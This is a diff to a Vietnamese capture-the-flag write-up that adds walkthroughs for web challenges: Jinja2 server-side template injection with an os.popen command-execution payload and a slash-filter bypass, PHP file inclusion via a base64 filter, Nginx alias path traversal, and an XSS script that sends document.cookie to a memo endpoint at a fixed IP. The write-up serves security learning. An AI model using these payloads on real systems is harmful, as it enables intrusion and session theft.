@@ -29,6 +29,10 @@
 - [Likeness](#likeness)
 - [Easy SSRF](#easy-ssrf)
 - [XXE-Injection](#xxe-injection)
+- [Simple SSTI](#simple-ssti)
+- [PHP Inclusion](#php-inclusion)
+- [Nginx Alias](#nginx-alias)
+- [Steal Cookie](#steal-cookie)
 ## Baby Address Note
 
 1. Dựa vào source code biết được bài này là sql injection. Với câu truy vấn `f"SELECT * FROM users WHERE uid='{uid}';"` ta có thể bypass bằng `' OR '1'='1' --`
@@ -341,6 +345,38 @@ for i in range(1, 101):
 2. Inject vào file upload mẫu ta chèn được vào xml.
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e13c7412-73d4-4299-baaf-cc9a91c37e40)
 
+## Simple SSTI
+
+1. Trước hết khi truy cập vào trang web nhận thấy rằng có 2 path không liên quan khi truy cập vào đều dính Not found.
+2. Vì đề bài cho ta biết đây là ssti nên ta sẽ thử inject thẳng vào url với payload `{{7*7}}` và `{{7*'7'}}` nhận được 2 kết quả lần lượt là `/49` và `7777777`.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7729e1ac-47d5-4f00-8607-0d6d53e37b70)
+3. Từ đó detect ra được rằng server đang dùng template `Jinja2`
+4. Thử các payload cho Jinja2 trên payload all the things thì thấy payload `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` là thành công.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a577146f-40ce-4461-a04c-132ceeb43e43)
+5. Thay ls => cat /flag.txt thì lại bị dính lỗi. Nhận thấy có vẻ như là site đã block dấu `/` nên ta sẽ bypass nó bằng cách thay `/` bằng `${HOME:0:1}`.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/21aa37ac-b7b8-40ec-af5f-77d3aa0f486f)
+6. Lấy thành công flag.
+
+## PHP Inclusion
+
+1. Đọc qua source code của site ta có thể nhận thấy ở page view ngta đã filter `preg_match('/flag|:/i', $file)` nên rất khó để có thể đọc file flag.php vì nó filter thằng tên file.
+2. Nhưng ta nhận thấy là ở page home có đoạn php dùng include `include $_GET['page']?$_GET['page'].'.php':'main.php';`. Ngoài ra ta còn biết là flag.php nằm ở path cụ thể.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/4e9a59fd-d887-43a0-8a06-df9d7b4ec603)
+3. Nhưng không thể đọc được flag. Thử b64 encode bằng php filter.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/1ceda422-f7e3-4d44-b2be-2df796e02b36)
+
+## Nginx Alias
+
+1. Truy cập vào site nhận thấy có endpoint `/app/static/welcome.txt` và biết được đây là Nginx Alias Traversal và file `run.py` nằm ở `/app/run.py` tức là có thể traversal với payload `/static../run.py`.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7920543f-30f8-445e-9019-75191c0f3f30)
+
+## Steal Cookie
+
+1. Ở bài này ta được biết có lỗ hổng xss ở param `param` và ở endpoint flag khi submit url đó thì một admin bot sẽ tự động click vào url đó. Ngoài ra ở endpoint memo sẽ lưu trữ giá trị của param memo vào site.
+2. Từ đó ta có thể xây dựng một kịch bản exploit như sau.
+3. Gọi đến hàm document.location để redirect đến endpoint memo cùng với giá trị của tham số memo truyền vào là document.cookie.
+``<script>document.location='http://13.212.34.169:32510/memo?memo='+document.cookie</script>``
+4. Sau khi gửi url đó cho bot. Bot click vào thì memo sẽ lưu giá trị cookie vào endpoint memo.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/deef0004-2328-4b70-b613-a970b8e80c7a)
+
 ## 
-
-
